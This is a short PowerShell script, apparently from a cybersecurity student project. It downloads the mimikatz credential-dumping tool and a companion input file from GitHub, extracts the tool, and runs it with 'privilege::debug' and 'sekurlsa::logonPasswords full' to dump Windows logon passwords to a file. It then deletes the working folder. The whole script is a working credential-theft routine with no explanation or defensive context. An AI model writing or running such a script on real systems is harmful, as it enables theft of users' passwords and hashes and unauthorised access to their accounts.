$repo_path = "$HOME/Desktop/ok"
mkdir $repo_path
$mimikatz_zip_path = "$repo_path/mimikatz.zip"
$mimikatz_path = "$repo_path/mimikatz"
$mimikatz_input_path = "$repo_path/input_mimikatz"
(new-object System.net.WebClient).DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.zip", $mimikatz_zip_path)
(new-object System.net.WebClient).DownloadFile("https://raw.githubusercontent.com/projetcybersecurite/ok/master/input_mimikatz", $mimikatz_input_path)
Add-Type -assembly "system.io.compression.filesystem"
[io.compression.zipfile]::ExtractToDirectory($mimikatz_zip_path, $mimikatz_path)
cd $repo_path
mimikatz/x64/mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit" > ./output_mimikatz 
echo "DONE"
cd ..
rm -rf $repo_path
